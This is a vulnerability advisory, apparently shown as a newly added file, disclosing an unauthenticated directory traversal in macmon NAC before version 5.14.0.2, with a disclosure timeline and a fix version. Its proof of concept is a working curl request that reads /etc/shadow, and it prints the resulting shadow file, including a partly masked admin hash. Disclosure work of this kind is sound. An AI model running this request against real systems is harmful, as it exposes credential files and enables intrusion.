@@ -1,0 +1,84 @@
+Title:
+======
+macmon NAC - Directory Traversal
+
+Author:
+=======
+Jens Regel, Schneider & Wulf EDV-Beratung GmbH & Co. KG
+
+CVE-ID:
+=======
+Not assigned
+
+Timeline:
+=========
+01.04.2019 Vulnerability discovered
+01.04.2019 Send details to security@macmon.eu
+02.04.2019 Vulnerability was fixed by vendor
+28.04.2020 Public disclosure
+
+Affected Products:
+==================
+macmon NAC before version 5.14.0.2
+
+Vendor Homepage:
+================
+https://www.macmon.eu/en/
+
+Details:
+========
+The http get parameter "?__address" is susceptible to a directory traversal attack. The vulnerability is exploited without prior authentication.
+The Apache server is running with root privileges, which also makes it possible to read out /etc/shadow.
+
+Proof of Concept:
+=================
+:~$ curl -i -k https://macmonip/login/?__address=../../../../../../../../etc/shadow
+HTTP/1.1 200 OK
+Date: Mon, 01 Apr 2019 13:23:44 GMT
+Server: Apache
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 1094
+Content-Type: text/plain;charset=UTF-8
+
+root:!:17801:0:99999:7:::
+daemon:*:17801:0:99999:7:::
+bin:*:17801:0:99999:7:::
+sys:*:17801:0:99999:7:::
+sync:*:17801:0:99999:7:::
+games:*:17801:0:99999:7:::
+man:*:17801:0:99999:7:::
+lp:*:17801:0:99999:7:::
+mail:*:17801:0:99999:7:::
+news:*:17801:0:99999:7:::
+uucp:*:17801:0:99999:7:::
+proxy:*:17801:0:99999:7:::
+www-data:*:17801:0:99999:7:::
+backup:*:17801:0:99999:7:::
+list:*:17801:0:99999:7:::
+irc:*:17801:0:99999:7:::
+gnats:*:17801:0:99999:7:::
+nobody:*:17801:0:99999:7:::
+systemd-timesync:*:17801:0:99999:7:::
+systemd-network:*:17801:0:99999:7:::
+systemd-resolve:*:17801:0:99999:7:::
+systemd-bus-proxy:*:17801:0:99999:7:::
+Debian-exim:!:17801:0:99999:7:::
+messagebus:*:17801:0:99999:7:::
+statd:*:17801:0:99999:7:::
+mysql:!:17801:0:99999:7:::
+macmon:*:17801:0:99999:7:::
+postfix:*:17801:0:99999:7:::
+snmp:*:17801:0:99999:7:::
+arpwatch:!:17801:0:99999:7:::
+bind:*:17801:0:99999:7:::
+freerad:*:17801:0:99999:7:::
+hacluster:*:17801:0:99999:7:::
+sshd:*:17801:0:99999:7:::
+admin:$6$L1prUJGM$ENNXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:17920:0:99999:7:::
+
+Fix:
+====
+Fixed in version 5.14.0.2.
